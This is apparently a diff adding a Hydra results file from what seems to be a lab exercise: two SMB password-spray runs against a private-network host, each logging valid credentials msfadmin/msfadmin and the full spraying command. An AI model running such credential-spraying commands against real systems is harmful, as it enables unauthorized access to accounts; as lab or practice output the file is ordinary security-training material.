@@ -1,0 +1,4 @@
+# Hydra v9.7 run at 2026-11-24 15:13:16 on 192.168.56.103 smb (hydra -L usuarios.txt -p msfadmin -o resultados-smb-spray-hydra.txt smb://192.168.56.103)
+[445][smb] host: 192.168.56.103   login: msfadmin   password: msfadmin
+# Hydra v9.7 run at 2026-11-24 15:15:51 on 192.168.56.103 smb (hydra -L usuarios.txt -p msfadmin -o resultados-smb-spray-hydra.txt smb://192.168.56.103)
+[445][smb] host: 192.168.56.103   login: msfadmin   password: msfadmin
